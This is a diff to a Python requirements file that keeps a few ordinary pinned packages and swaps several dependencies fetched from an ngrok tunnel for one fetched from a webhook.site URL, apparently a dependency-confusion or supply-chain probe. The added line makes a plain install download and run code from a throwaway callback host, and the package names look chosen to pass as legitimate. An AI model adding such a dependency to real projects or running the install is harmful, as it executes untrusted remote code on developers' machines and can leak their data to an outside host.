@@ -2,7 +2,4 @@
 colorama==0.4.3
 pytest==6.2.2
 win_unicode_console==0.5
-sp-s-dd @ git+https://a25f-2a0d-6fc2-6430-1c00-6c2d-8d7d-2238-8b0a.ngrok-free.app/snyk3pic2/sp-s-dd
-pytest
-pytaesa @ git+https://a25f-2a0d-6fc2-6430-1c00-6c2d-8d7d-2238-8b0a.ngrok-free.app/snyk3pic2/pytaesa
-pytaesb@git+https://a25f-2a0d-6fc2-6430-1c00-6c2d-8d7d-2238-8b0a.ngrok-free.app/snyk3pic2/pytaesb
+sp-s-df @ git+https://webhook.site/40ec81d0-651c-4818-b79f-b4e50686f6ad/snkpinkh1/sp-s-df
